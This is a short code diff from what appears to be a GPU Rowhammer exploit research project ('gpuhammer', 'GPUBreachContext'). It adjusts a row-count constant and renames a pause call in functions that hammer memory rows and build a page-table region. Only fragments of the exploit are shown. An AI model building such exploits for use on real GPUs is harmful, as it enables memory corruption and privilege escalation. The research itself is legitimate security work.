@@ -92,7 +92,7 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
   const uint64_t min_rowId = 30016 - 94;
   const uint64_t max_rowId = 30016 + 5;
   const uint64_t row_step = 4;
-  const uint64_t num_rows = 31400;
+  const uint64_t num_rows = 31000;
   const uint64_t agg_pat = std::stoull ("0xAA", nullptr, 16);
 
   std::ifstream row_set_file ("/home/rootuser/gpuhammer-reloaded/gpuhammer/"
@@ -217,7 +217,7 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBr
   std::cout << "(Step 2 Success) First PT Region Generated: Press "
                "\033[1;32mEnter Key\033[0m to continue... "
             << '\n';
-  pause ();
+  paused ();
   /****************************************************************/
 
   /* Free up GPU/CPU memory by releasing the evicted memories */
